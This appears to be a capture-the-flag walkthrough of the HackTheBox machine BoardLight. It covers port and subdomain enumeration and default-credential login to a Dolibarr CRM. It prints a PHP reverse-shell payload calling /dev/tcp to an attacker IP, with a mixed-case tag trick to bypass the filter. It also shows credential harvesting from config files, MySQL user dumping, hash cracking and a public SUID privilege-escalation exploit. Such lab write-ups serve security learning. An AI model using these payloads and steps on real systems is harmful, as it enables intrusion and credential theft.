---
title: BoardLight
draft: false
tags:
---
![[BoardLight.png|500]]![[Pasted image 20250306232927.png|200]]

Machine: https://app.hackthebox.com/machines/BoardLight

---
# Enumeration
## Port Scanning
- As always, we start with a [[content/Tools/Nmap|Nmap]] scan
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.11 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250307145046.png]]

- Now run some common scripts and check the version running
```bash
nmap -p22,80 -sVC -Pn -n --min-rate 5000 10.10.11.11 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250307153928.png]]


## Web Side
- It use this tecnologies using [[wappanalyzer]] and [[whatweb]]:
```bash
whatweb http://10.10.11.11/
```
>[!example]- Result
>![[Pasted image 20250307154735.png]]
>![[Pasted image 20250307154835.png]]

Email: `info@board.htb`

- Enumerating directories and subdomains, using [[gobuster]]
```bash
gobuster dir -u http://board.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 50

gobuster vhost -u http://board.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 20
```
>[!example]- Result
>![[Pasted image 20250307155405.png]]
>![[Pasted image 20250307155353.png]]

Subdomain: `crm.board.htb`
- we have a login panel, and... looks like `admin:admin` are valid credentials 
>[!example]- Result
>![[Pasted image 20250307155743.png]]
>![[Pasted image 20250307155836.png]]

- As we have access to the web page we can upload our php script and get a ReverShell, first we need to create a web side, and a new page, with this content
>[!warning] The page doesnt allow you to use `<?php ?>` but we can use `<?pHp ?>`, and u have to do this process as fast as u can (because the server delete your site)
```php
<?pHp exec ("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.6/4444 0>&1'")?>
```

Attacker
```bash
nc -lnvp 4444
```

>[!example]- Result
>![[Pasted image 20250307164651.png]]
>![[Pasted image 20250307164812.png]]
>![[Pasted image 20250307164940.png]]
>![[Pasted image 20250307165008.png]]
>![[Pasted image 20250307165140.png]]


# Privilege Escalation
## Enumeration
- Looks like this machine have a MySQL database running
```bash
netstat -nat
```
>[!example]- Result
>![[Pasted image 20250307165957.png]]

- If we check config files we can see some credentials
```bash
find ./ -type f -name "*conf*.*" -exec grep -ilE "*pass*" {} \; 
```
>[!example]- Result
>![[Pasted image 20250307175636.png]]
```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```
>[!example]- Result
>![[Pasted image 20250307175804.png]]

MySQL Credes: `dolibarrowner:serverfun2$2023!!`

- now we can connect to mysql server and enumerate it
```bash
mysql -u dolibarrowner -p
show databases;
connect dolibarr
show tables;
select login,pass,pass_crypted,pass_temp,email,admin from llx_user;
```
>[!example]- Result
>![[Pasted image 20250307180431.png]]

- We can try to crack it, but nothing especial
```bash
.\hashcat.exe -a 0 .\dolibarrHash .\rockyou.txt -m 3200
```

- If we use the password `serverfun2$2023!!` with the user 'Larissa' it works!, so lets keep enumerating and we see that the version of Linux is 5.15 that is vulnerable to "DirtyPipe" (but doesn't works), researching a littel bit i find that this binaries are vulnerable
```bash
find / -type f -perm -4000 2>/dev/null
```
>[!example]- Result
>![[Pasted image 20250307191602.png]]

- So we use this [POC](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) 
```bash
chmod +x exploit.sh
./exploit.sh
```
>[!example]- Result
>![[Pasted image 20250307191931.png]]


